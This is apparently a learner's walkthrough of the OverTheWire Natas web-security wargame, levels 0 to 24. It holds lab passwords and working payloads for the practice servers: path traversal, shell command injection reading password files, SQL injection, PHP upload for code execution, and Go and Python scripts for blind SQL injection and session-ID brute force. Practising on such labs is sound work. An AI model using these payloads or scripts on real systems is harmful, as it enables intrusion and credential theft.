# Banditnatas wargame https://overthewire.org/wargames/natas/

## read hint to solve, before read write up, try hard 
https://onestepcode.com/no-solution-natas-guide-overthewire/

## Level0
![](https://i.imgur.com/dG5O5h2.png)

after view page source:
pass: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 

## level1
![](https://i.imgur.com/LiI98xL.png)

view page source
pass: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

## level2
![](https://i.imgur.com/GgvHhiT.png)

use url /files/users.txt
pass: natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

## level3

![](https://i.imgur.com/guDh6mc.png)

from hint -> Google -> robots.txt

![](https://i.imgur.com/0Q88ijH.png)

see folder /s3cr3t/

![](https://i.imgur.com/h4v5zuI.png)

and check user.txt

![](https://i.imgur.com/aQD7Ybn.png)

## level4

I check this 
[request fiels ](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields#Request_fields) in http request

![](https://i.imgur.com/xPV74RT.png)

I change Referer: http://natas5.natas.labs.overthewire.org/

Flag: The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

## level 5
I change the files cookie Login=1

![](https://i.imgur.com/y95LOfX.png)

Flag The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

## level6

I use relative path to get fins /includes/secret.inc
![](https://i.imgur.com/oaG7gK8.png)

then I insert that varible
![](https://i.imgur.com/xMV79WV.png)

Flag: The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 

## level 7

Use [path traversal attack](https://owasp.org/www-community/attacks/Path_Traversal)

payload: ../../../../etc/natas_webpass/natas8

![](https://i.imgur.com/H7M0yIe.png)

Flags:  a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

## level8

![](https://i.imgur.com/pjqzE0X.png)
I write a function to decode function encodeSecret the I get the secret
![](https://i.imgur.com/YAO155z.png)

secret: oubWYf2kBq

![](https://i.imgur.com/UmThovt.png)

Flag:  The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

## level 9

I use payload: dictionary.txt ; cat /etc/natas_webpass/natas10 ;grep -i naaa dictionary.txt

to cat password

Flag: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

## level 10

![](https://i.imgur.com/OkvUYKO.png)

payload: a /etc/natas_webpass/natas11

because grep -i can search fo mutiple file

Flag: /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

## level 11

I use XOR:
d xor k = c  -> k = d xor c

I use php to find key
I use cookies to xor with defaulrData to find key
firts I need to decodebase64
![](https://i.imgur.com/FEWnZk0.png)
I have value ![](https://i.imgur.com/VTJCYiO.png)
![](https://i.imgur.com/E0oB5Qr.png)

Then I have key
![](https://i.imgur.com/pGnGQCf.png)
-> key=KNHL
Then I change ![](https://i.imgur.com/IF4m0pp.png)

after I use function
![](https://i.imgur.com/5yzh1wp.png)
AfterI have new cookies:
![](https://i.imgur.com/I6y8Vml.png)
So I use purpSuit to set new cookies 
![](https://i.imgur.com/tKEfhkq.png)

Flag: The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

## level 12

I create a file to get the password of natas 13
![](https://i.imgur.com/b0nTIDY.png)


Then I Upload and use BurpSuit to modified

![](https://i.imgur.com/fZuePkU.png)

And I get the flag use info of result

![](https://i.imgur.com/zyYzq5c.png)

Flag: natas13 : lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

## Level 13

First I create a file jpeg and insert comment php in to it

![](https://i.imgur.com/BEM1972.png)

Then I upload this and use Burpsuit to modified

![](https://i.imgur.com/U9NjXjh.png)
After upload success I receive a folder, access it I get flag

![](https://i.imgur.com/n38sKUu.png)

Flags: natas14:  qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

## level14:

I use sql injection attack
payload: username=natas15"OR 1=1#&password=password

![](https://i.imgur.com/JAGNQrB.png)

Flag: The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

## level15

I read this [write up](https://www.abatchy.com/2016/11/natas-level-14-and-15)

and [request module](https://requests.readthedocs.io/en/latest/user/quickstart/#make-a-request) to understand more about payload python

and after run I have value

Flag: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

## level16

Thanks to this authors's[write-up](https://mcpa.github.io/natas/wargame/web/overthewire/2015/10/01/natas16/)
and I know this features's [GNU](https://www.gnu.org/software/bash/manual/bash.html#Command-Substitution)

FLAG: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

## level 17
I read this [blog](TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V) but because python run quite slow, so I write it in Go Lang

```go=

package main

import (
        "fmt"
        "net/http"
        "net/url"
        "strings"
//      "encoding/base64"
        "io/ioutil"
        "time"

)
func main() {
      //part1 find possible character
        allchars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        //outtext := ""
        password := ""

        for _, c := range allchars {

                values := url.Values{}
                values.Set("username","natas18\"AND password like binary \"%" + string(c) +"%\" AND SLEEP(2)#")

                data := strings.NewReader(values.Encode())
                //stat time now
                start := time.Now()
                req, err := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org", data)
                if err != nil {
                        fmt.Println("Error", err)
                        return
                }

                req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
                //req.Header.Add("Authorization", "Basic "+encode)
                req.SetBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
                //Make the request and read the response

                resp, err := http.DefaultClient.Do(req)

                if err != nil {
                        fmt.Println("Error", err)
                        return
                }
                defer resp.Body.Close()

                //print status
                fmt.Println("Status", resp.Status)
                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        fmt.Println("Error:", err)
                        return
                }

                //Elapsed time from start
                elapsed := time.Since(start) 
                fmt.Println("Body:", string(body))
                fmt.Println("Time: ", elapsed)
                if elapsed > 2000000000 {
                        password += string(c) 
                        fmt.Println("password: ", password)
                }


        }
/outtext := "8kFgPV84uLwvZkGn6kqQ68knqG"

                   //agknoquvwxDEFGJLNPQUVZ468
        //password := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[]^_{|}~"
        password := "agknoquvwxDEFGJLNPQUVZ468"
        outtext := "8kFgPV84uLwvZkGn6okJQ6aq"
        temp := ""
        //outtext := "8"
        for len(outtext) < 32 {

                for _, c := range password {
                        values := url.Values{}
                        temp = string(c) + outtext

                         
                        values.Set("username","natas18\"AND password like  BINARY \"%" + temp +"\" AND SLEEP(2)#")


                        data := strings.NewReader(values.Encode())
                        //stat time now
                        start := time.Now()
                        req, err := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org", data)

                        if err != nil {
                                fmt.Println("Error", err)
                                return
                        }

                        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
                        //req.Header.Add("Authorization", "Basic "+encode)
                        req.SetBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
                        //Make the request and read the response

                        resp, err := http.DefaultClient.Do(req)

                        if err != nil {
                                fmt.Println("Error", err)
                                return
                        }
                        defer resp.Body.Close()

                        //print status

                        //fmt.Println("Status", resp.Status)
                        body, err := ioutil.ReadAll(resp.Body)
                        if err != nil {
                                fmt.Println("Error:", err)
                                return
                        }

                        //Elapsed time from start
                        elapsed := time.Since(start) 

                        if string(body) != "" {
                           fmt.Println(temp)
                        }
                        //fmt.Println("Body:", string(body))
                        //fmt.Println("Time: ", elapsed)
                        if elapsed > 2000000000 {
                                outtext = string(c) + outtext 
                                fmt.Println("outtext: ", outtext)
                        }
                }
        }


}

```

part 1, I seach all posibbly character in password, part 2 then I bruteFroce depend wordlist in part 1

After run I have wordlist: `agknoquvwxDEFGJLNPQUVZ468`
And then I have password:
![](https://i.imgur.com/r66ChCR.png)

Flag: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`


## level 18
after I read this [blog](https://ctf.yeuchimse.com/overthewire-natas-level-18/)

get source code 
```php=
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "<censored>" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

```

because of having only 640 cooki id, and admin is one of them -> brute force

```python=
import urllib.request
import http.client
import base64
import http.cookiejar
import sys

def send_request(session_id):
    # Set up a cookie jar
    cookie_jar = http.cookiejar.CookieJar()
    # Add the PHPSESSID cookie to the jar
    cookie = http.cookiejar.Cookie(
        version=0,
        name='PHPSESSID',
        value=str(session_id),
        port=None,
        port_specified=False,
        domain='natas18.natas.labs.overthewire.org',
        domain_specified=True,
        domain_initial_dot=False,
        path='/',
        path_specified=True,
        secure=False,
        expires=None,
        discard=False,
        comment=None,
        comment_url=None,
        rest=None,
        rfc2109=False
    )
    cookie_jar.set_cookie(cookie)

    # Set up basic authentication
    username = 'natas18'
    password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
    auth_string = f"{username}:{password}".encode('ascii')
    base64_auth_string = base64.b64encode(auth_string).decode('ascii')
    headers = {'Authorization': f'Basic {base64_auth_string}'}

    # Set up the POST request
    url = 'http://natas18.natas.labs.overthewire.org'
    data = {'username': 'admin', 'password': 'password'}
    data = urllib.parse.urlencode(data).encode('utf-8')

    # Send the request and get the response
    req = urllib.request.Request(url, data, headers=headers)
    cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    opener = urllib.request.build_opener(cookie_handler)
    response = opener.open(req)
    html = response.read().decode('utf-8')

    return html


def main():
    for i in range(1, 641):
        result = send_request(i)
        if "You are an admin. The credentials for the next level are" in result:
            print(f"The session is is {i}")
            sys.exit(0)



if __name__ == "__main__":
    main()

```

The result is : 119

Use burp suit to get the flag

![](https://i.imgur.com/VxfKiBm.png)

Flag: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

## level 19
after login I see session is encoded, try to decode it use [this ](https://hashes.com/en/decrypt/hash)

![](https://i.imgur.com/4inJDJX.png)

I use this python code 
```python=
import urllib.request
import http.client
import base64
import http.cookiejar
import sys
import binascii


def send_request(session_id):
    # tạo cookies
    cookie_jar = http.cookiejar.CookieJar()
    # Thêm trường cookies PHPSESSID, và brute force trường này
    cookie = http.cookiejar.Cookie(
        version=0,
        name='PHPSESSID',
        value=str(session_id),
        port=None,
        port_specified=False,
        domain='natas19.natas.labs.overthewire.org',
        domain_specified=True,
        domain_initial_dot=False,
        path='/',
        path_specified=True,
        secure=False,
        expires=None,
        discard=False,
        comment=None,
        comment_url=None,
        rest=None,
        rfc2109=False
    )
    cookie_jar.set_cookie(cookie)

    # Xác thực với tến người dùng natas19 và mật khẩu
    username = 'natas19'
    password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'
    auth_string = f"{username}:{password}".encode('ascii')
    base64_auth_string = base64.b64encode(auth_string).decode('ascii')
    headers = {'Authorization': f'Basic {base64_auth_string}'}

    # Dữ liệu để post đến natas19
    url = 'http://natas19.natas.labs.overthewire.org'
    data = {'username': 'admin', 'password': 'password'}
    data = urllib.parse.urlencode(data).encode('utf-8')

    # Gửi request đến và lấy dữ liệu phản hồi về
    req = urllib.request.Request(url, data, headers=headers)
    cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    opener = urllib.request.build_opener(cookie_handler)
    response = opener.open(req)
    html = response.read().decode('utf-8')

    return html



def main():
    ''' gửi 640 gói tin đến mục tiêu và kiểm tra trang phản hồi nào có dữ liệu cần 
    tìm, sủ dụng binascii để mã hóa encode hex string dữ liệu'''
    for i in range(1, 641):
        string = f"{i}-admin"
        hex_string = binascii.hexlify(string.encode())
        session_id = hex_string.decode()
 
        result = send_request(session_id)
        if "You are an admin. The credentials for the next level are" in result:
            print(f"Session id  cần tìm là {session_id}")
            sys.exit(0)



if __name__ == "__main__":
    main()

```
Similar level 28, but this time use hex string encode .

result: ![](https://i.imgur.com/wXmu6w8.png)


Flag: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH

## level 20

Thanks to this [blog](https://ctf.yeuchimse.com/overthewire-natas-level-20/)
In my write function it save value in one line
```php=
function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
     
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```

In this functin my read, it read mutiple line, so $_SESSION can have mutiple atributes

```php=
 foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
```


payload: user%0Aadmin 1

so get flag 



Flag: Username: natas21
Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56

## level 21

in second page, access to source code
```php=
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```
 User can add or modified attributes in $_SESSION in request
 
I try to add attribute admin:1 in to request
![](https://i.imgur.com/KpnrXLW.png)

The I reload page 2 with debug
![](https://i.imgur.com/F0VWilL.png)

then I return first page and see password

![](https://i.imgur.com/hBawqn3.png)

Flag: Username: natas22
Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s

## level 22

Access the source code, i see, we can get the password if in request url has attributes `revelio`

![](https://i.imgur.com/RpVnxKO.png)

However, these code will redirect me using header() function

![](https://i.imgur.com/ZFbzCcY.png)

But header() function will only be executed in client side (my browser) not server side. To inspect it, using Network tap in developer tool.

![](https://i.imgur.com/UZw0Rw1.png)

As you can see, my browser received content, however it automaticly redirecy as status 302

so I use `curl` command to get the content.


![](https://i.imgur.com/z68GGV4.png)

```shell=
curl -u natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s http://natas22.natas.labs.overthewire.org/?revelio 

```
Flag: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj

## level 23

first i need to read this code 
```php=
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
<body>
<h1>natas23</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
to get target i need to type a pass word content `iloveyou` ans greater than 10
so use `typecasting in php` 

payload: `123iloveyou`

![](https://i.imgur.com/V1SOjV4.png)

Flag: sername: natas24 Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r

## level 24

After read this [blog](https://blog.riotsecurityteam.com/bypassing-php-strcmp) I can under stand the vulnerable in strcmp() in php

![](https://i.imgur.com/OFe6txX.png)

Flag: Username: natas25 Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx

## level 25



































